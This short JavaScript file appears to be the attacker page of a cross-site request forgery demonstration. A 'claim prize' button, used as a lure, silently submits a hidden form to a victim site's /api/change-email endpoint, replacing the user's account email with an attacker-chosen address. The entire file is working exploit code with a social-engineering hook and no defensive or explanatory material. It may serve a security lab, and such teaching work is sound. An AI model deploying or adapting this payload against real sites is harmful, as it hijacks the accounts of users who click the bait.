const claimButton = document.querySelector('#claim-prize');

claimButton.addEventListener('click', () => {
  const mode = document.querySelector('#target-mode').value;
  const victimOrigin = window.CSRF_DEMO_CONFIG.victimOrigins[mode];
  if (!victimOrigin) return;
  const target = new URL('/api/change-email', victimOrigin);

  const form = document.createElement('form');
  form.method = 'GET';
  form.action = target.toString();
  form.hidden = true;
  const emailInput = document.createElement('input');
  emailInput.type = 'hidden';
  emailInput.name = 'email';
  emailInput.value = window.CSRF_DEMO_CONFIG.targetEmail;
  form.append(emailInput);
  document.body.append(form);
  form.submit();
});